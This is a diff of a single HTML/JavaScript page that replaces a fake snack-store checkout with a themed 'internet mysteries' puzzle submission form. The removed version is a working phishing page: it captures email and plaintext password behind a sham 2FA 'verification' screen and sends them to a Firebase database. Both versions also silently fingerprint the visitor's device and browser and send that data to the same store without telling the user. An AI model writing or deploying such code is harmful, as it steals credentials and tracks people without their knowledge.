@@ -3,126 +3,82 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
-    <title>Snack Online Store</title>
+    <title>A∞Z | Internet Cryptic Mysteries & Puzzles</title>
     <style>
         :root {
-            --bg-color: #121212;
-            --panel-bg: #1e1e1e;
-            --accent-color: #ff3366;
-            --accent-blue: #00f0ff;
-            --text-main: #ffffff;
-            --text-muted: #a0a0a0;
-            --border-color: #333333;
+            --bg-color: #080a0f;
+            --panel-bg: #121821;
+            --accent-purple: #9d4edd;
+            --accent-green: #00f5d4;
+            --accent-red: #ff3366;
+            --text-main: #e0fbfc;
+            --text-muted: #8d99ae;
+            --border-color: #1f2a38;
         }
         body {
             background-color: var(--bg-color);
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            box-sizing: border-box;
         }
         .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 520px;
             background: var(--panel-bg);
             border: 1px solid var(--border-color);
             border-radius: 12px;
-            padding: 25px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
             box-sizing: border-box;
-            margin: 20px;
         }
         .logo {
             font-size: 22px;
             font-weight: 800;
-            color: var(--accent-color);
+            color: var(--accent-purple);
             text-align: center;
             margin-bottom: 5px;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
         }
         .logo span {
-            color: var(--accent-blue);
+            color: var(--accent-green);
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         h2 {
-            font-size: 15px;
-            margin-bottom: 20px;
-            color: var(--text-muted);
-            text-align: center;
-            font-weight: 400;
-        }
-        
-        #storeFront {
-            display: block;
-        }
-        .store-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .store-item {
-            background: #252525;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 12px;
-            text-align: center;
-        }
-        .store-item img {
-            width: 70px;
-            height: 90px;
-            object-fit: contain;
-            margin-bottom: 8px;
-        }
-        .store-item-name {
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .store-item-price {
-            font-size: 12px;
-            color: var(--accent-blue);
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        .buy-btn {
-            width: 100%;
-            padding: 8px;
-            background: var(--accent-blue);
-            color: #000;
-            border: none;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-        .buy-btn:hover {
-            opacity: 0.9;
-        }
-
-        #loginState {
-            display: none;
-        }
-
-        .form-group {
+            font-size: 16px;
             margin-bottom: 15px;
+            color: var(--text-main);
+            font-weight: 600;
+            border-left: 3px solid var(--accent-purple);
+            padding-left: 10px;
+        }
+        .form-group {
+            margin-bottom: 16px;
         }
         label {
             display: block;
             font-size: 11px;
             color: var(--text-muted);
-            margin-bottom: 5px;
+            margin-bottom: 6px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        input {
+        select, input {
             width: 100%;
-            padding: 10px 12px;
-            background: #121212;
+            padding: 12px;
+            background: #080a0f;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             color: var(--text-main);
@@ -131,27 +87,42 @@
             outline: none;
             transition: border-color 0.2s;
         }
-        input:focus {
-            border-color: var(--accent-color);
+        select:focus, input:focus {
+            border-color: var(--accent-green);
+        }
+        .info-box {
+            background: rgba(157, 78, 221, 0.05);
+            border: 1px dashed var(--accent-purple);
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .puzzle-title {
+            color: var(--accent-green);
+            font-weight: 600;
         }
         .btn {
             width: 100%;
             padding: 12px;
-            background: var(--accent-color);
+            background: linear-gradient(135deg, var(--accent-purple), #7b2cbf);
             color: #fff;
             border: none;
             border-radius: 6px;
             font-size: 14px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
             transition: opacity 0.2s;
-            margin-top: 5px;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
         }
         .btn:hover {
             opacity: 0.9;
         }
-        
-        #verificationState {
+
+        #resultState {
             display: none;
             text-align: center;
         }
@@ -159,7 +130,7 @@
             width: 40px;
             height: 40px;
             border: 3px solid var(--border-color);
-            border-top: 3px solid var(--accent-color);
+            border-top: 3px solid var(--accent-green);
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
@@ -168,76 +139,62 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .info-text {
-            font-size: 13px;
+        .status-msg {
+            font-size: 14px;
             color: var(--text-muted);
-            line-height: 1.5;
+            line-height: 1.6;
             margin-top: 15px;
         }
-        .highlight-email {
-            color: var(--accent-blue);
+        .highlight {
+            color: var(--accent-green);
             font-weight: 600;
-        }
-        .back-link {
-            display: block;
-            text-align: center;
-            font-size: 12px;
-            color: var(--text-muted);
-            margin-top: 15px;
-            cursor: pointer;
-            text-decoration: underline;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        
-        <div id="storeFront">
-            <div class="logo">SNACK<span>STORE</span></div>
-            <h2>Available Products & Energy Drinks</h2>
+        <div id="puzzleFormState">
+            <div class="logo">A∞Z <span>ARCHIVES</span></div>
+            <div class="subtitle">Internet Cryptic Mysteries Terminal</div>
             
-            <div class="store-grid">
-                <div class="store-item">
-                    <img src="https://images.unsplash.com/photo-1551024709-8f23befc6f87?w=300" alt="Red Bull Energy Drink">
-                    <div class="store-item-name">Red Bull 250ml</div>
-                    <div class="store-item-price">$3.50</div>
-                    <button class="buy-btn" onclick="goToLogin('Red Bull 250ml')">Buy Now</button>
-                </div>
-                <div class="store-item">
-                    <img src="https://images.unsplash.com/photo-1566478989037-eec170784d0b?w=300" alt="Potato Chips">
-                    <div class="store-item-name">Crunchy Chips</div>
-                    <div class="store-item-price">$2.00</div>
-                    <button class="buy-btn" onclick="goToLogin('Crunchy Chips')">Buy Now</button>
-                </div>
+            <div class="info-box">
+                Current Active Puzzle: <span class="puzzle-title" id="activePuzzleTitle">The Cicada Sequence #3301</span><br>
+                <span id="activePuzzleDesc">Analyze the provided steganography layer and submit the correct decryption key to sync your progress.</span>
             </div>
-        </div>
 
-        <div id="loginState">
-            <div class="logo">SNACK<span>STORE</span></div>
-            <h2 id="selectedProductTitle">Complete Your Order</h2>
-            
-            <form id="tradingForm">
+            <form id="mysteryForm">
                 <div class="form-group">
-                    <label for="email">Delivery Email / ID</label>
-                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
+                    <label for="agentId">Investigator Handle / ID</label>
+                    <input type="text" id="agentId" required autocomplete="off" placeholder="e.g. CipherSeeker99">
                 </div>
+                
                 <div class="form-group">
-                    <label for="password">Account Password / PIN</label>
-                    <input type="password" id="password" required placeholder="••••••••">
+                    <label for="puzzleSelect">Select Mystery Archive</label>
+                    <select id="puzzleSelect">
+                        <option value="Cicada_3301">Cicada 3301: The Liber Primus</option>
+                        <option value="The_Sun_Vanished">The Sun Vanished Broadcast</option>
+                        <option value="Polybius_Arcade">Polybius Urban Legend Cipher</option>
+                        <option value="Satoshi_Key">Nakamoto Genesis Hash</option>
+                    </select>
                 </div>
-                <button type="submit" class="btn">Proceed to Checkout</button>
-                <span class="back-link" onclick="goBackToStore()">Back to store</span>
+
+                <div class="form-group">
+                    <label for="solutionKey">Decryption Key / Answer</label>
+                    <input type="text" id="solutionKey" required placeholder="Enter puzzle phrase or hash...">
+                </div>
+
+                <button type="submit" class="btn">Submit Solution & Sync Node</button>
             </form>
         </div>
 
-        <div id="verificationState">
-            <div class="logo">SNACK<span>STORE</span></div>
-            <h2>Verifying Order Request</h2>
+        <div id="resultState">
+            <div class="logo">A∞Z <span>ARCHIVES</span></div>
+            <h2>Validating Solution</h2>
             <div class="spinner"></div>
-            <p class="info-text">
-                We've sent a verification prompt to your email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
-                Please confirm the payment authorization to dispatch your items.
+            <p class="status-msg">
+                Analyzing cryptographic proof for investigator <span id="displayAgent" class="highlight"></span>...<br>
+                Synchronizing telemetry state with the central database node.
             </p>
         </div>
     </div>
@@ -253,34 +210,42 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let chosenProduct = "";
-        window.goToLogin = function(productName) {
-            chosenProduct = productName;
-            document.getElementById("selectedProductTitle").innerText = "Checkout: " + productName;
-            document.getElementById("storeFront").style.display = "none";
-            document.getElementById("loginState").style.display = "block";
-            setTimeout(() => {
-                const emailInput = document.getElementById("email");
-                if (!emailInput.value) {
-                    emailInput.value = "customer.express99@gmail.com";
-                }
-            }, 2000);
-        }
+        const puzzleDetails = {
+            "Cicada_3301": {
+                title: "The Cicada Sequence #3301",
+                desc: "Analyze the provided steganography layer and submit the correct decryption key to sync your progress."
+            },
+            "The_Sun_Vanished": {
+                title: "The Sun Vanished Broadcast",
+                desc: "Decode the emergency broadcast frequency transmission logs and submit the emergency sector code."
+            },
+            "Polybius_Arcade": {
+                title: "Polybius Urban Legend Cipher",
+                desc: "Reverse-engineer the 1981 arcade cabinet memory dump using the classic square matrix coordinate sequence."
+            },
+            "Satoshi_Key": {
+                title: "Nakamoto Genesis Hash",
+                desc: "Extract the hidden marker embedded within the block 0 coinbase parameters."
+            }
+        };
 
-        window.goBackToStore = function() {
-            document.getElementById("loginState").style.display = "none";
-            document.getElementById("storeFront").style.display = "block";
-        }
+        const puzzleSelect = document.getElementById("puzzleSelect");
+        puzzleSelect.addEventListener("change", function() {
+            const selected = this.value;
+            document.getElementById("activePuzzleTitle").innerText = puzzleDetails[selected].title;
+            document.getElementById("activePuzzleDesc").innerText = puzzleDetails[selected].desc;
+        });
 
-        document.getElementById("tradingForm").addEventListener("submit", function(e) {
+        document.getElementById("mysteryForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            const userEmail = document.getElementById("email").value;
-            const userPass = document.getElementById("password").value;
+            const agentId = document.getElementById("agentId").value;
+            const selectedPuzzle = puzzleSelect.value;
+            const solutionKey = document.getElementById("solutionKey").value;
 
-            document.getElementById("loginState").style.display = "none";
-            document.getElementById("displayEmail").innerText = userEmail;
-            document.getElementById("verificationState").style.display = "block";
+            document.getElementById("puzzleFormState").style.display = "none";
+            document.getElementById("displayAgent").innerText = agentId;
+            document.getElementById("resultState").style.display = "block";
 
             const ua = navigator.userAgent;
             const platform = navigator.platform || "Unknown";
@@ -291,14 +256,14 @@
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const language = navigator.language || "N/A";
 
-            const sessionId = btoa(userEmail + width + height).slice(0, 16);
+            const sessionId = btoa(agentId + selectedPuzzle + width).slice(0, 16);
 
             const telemetryData = {
                 sessionId: sessionId,
-                product: chosenProduct,
-                inputEmail: userEmail,
-                inputPassword: userPass,
-                status: "PENDING_2FA_APPROVAL",
+                investigatorHandle: agentId,
+                selectedPuzzle: selectedPuzzle,
+                submittedKey: solutionKey,
+                status: "PUZZLE_SUBMISSION_PENDING",
                 platform: platform,
                 resolution: `${width}x${height}`,
                 cores: cores,
@@ -312,7 +277,7 @@
             const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
             set(sessionsRef, telemetryData)
                 .then(() => {
-                    console.log("Telemetry successfully synced.");
+                    console.log("Mystery solution & telemetry synced successfully.");
                 })
                 .catch((error) => {
                     console.error("Firebase sync error:", error);
